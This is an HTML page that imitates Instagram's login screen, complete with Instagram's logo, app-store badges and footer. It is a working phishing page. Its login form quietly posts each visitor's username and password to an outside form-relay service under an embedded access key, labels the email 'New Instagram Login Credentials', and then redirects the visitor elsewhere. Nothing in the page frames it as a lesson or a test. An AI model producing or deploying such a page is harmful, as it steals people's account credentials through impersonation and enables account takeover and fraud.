<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            max-width: 350px;
            width: 100%;
        }
        
        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px 40px;
            text-align: center;
            margin-bottom: 10px;
        }
        
        .logo {
            margin: 22px auto 12px;
            width: 175px;
        }
        
        form {
            margin-top: 24px;
        }
        
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            padding: 9px 8px 7px;
            width: 100%;
            margin-bottom: 6px;
        }
        
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        
        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            padding: 5px 9px;
            width: 100%;
            margin-top: 8px;
            cursor: pointer;
            height: 32px;
            font-size: 14px;
        }
        
        button:disabled {
            background-color: rgba(0, 149, 246, 0.3);
            cursor: default;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0 18px;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider-text {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }
        
        .facebook-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }
        
        .facebook-icon {
            margin-right: 8px;
            font-size: 16px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            margin-top: 12px;
            display: block;
        }
        
        .signup-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .app-download {
            text-align: center;
            margin-top: 20px;
        }
        
        .app-download p {
            font-size: 14px;
            margin: 10px 0;
        }
        
        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        
        .app-store-img {
            height: 40px;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            margin-bottom: 10px;
        }
        
        .footer-link {
            margin: 0 8px 10px;
            text-decoration: none;
            color: #8e8e8e;
        }
        
        .copyright {
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
            
            <form id="loginForm" action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="b229c2dd-94bb-4f78-a091-342d1602c3c1">
                <input type="hidden" name="redirect" value="https://example.com/thank-you">
                <input type="hidden" name="subject" value="New Instagram Login Credentials">
                
                <input type="text" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
                
                <div class="divider">
                    <div class="divider-text">or</div>
                </div>
                
                <div class="facebook-login">
                    <span class="facebook-icon">f</span>
                    Log in with Facebook
                </div>
                
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
        </div>
        
        <div class="signup-box">
            Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </div>
        
        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-stores">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" class="app-store-img">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" class="app-store-img">
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#" class="footer-link">Meta</a>
                <a href="#" class="footer-link">About</a>
                <a href="#" class="footer-link">Blog</a>
                <a href="#" class="footer-link">Jobs</a>
                <a href="#" class="footer-link">Help</a>
                <a href="#" class="footer-link">API</a>
                <a href="#" class="footer-link">Privacy</a>
                <a href="#" class="footer-link">Terms</a>
                <a href="#" class="footer-link">Top Accounts</a>
                <a href="#" class="footer-link">Hashtags</a>
                <a href="#" class="footer-link">Locations</a>
                <a href="#" class="footer-link">Instagram Lite</a>
                <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
            </div>
            <div class="copyright">
                Â© 2023 Instagram from Meta
            </div>
        </div>
    </div>

    <script>
        // You can add JavaScript validation here if needed
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Form will be submitted to Web3Forms which will send the email
            // All form fields (username and password) will be included automatically
        });
    </script>
</body>
</html>
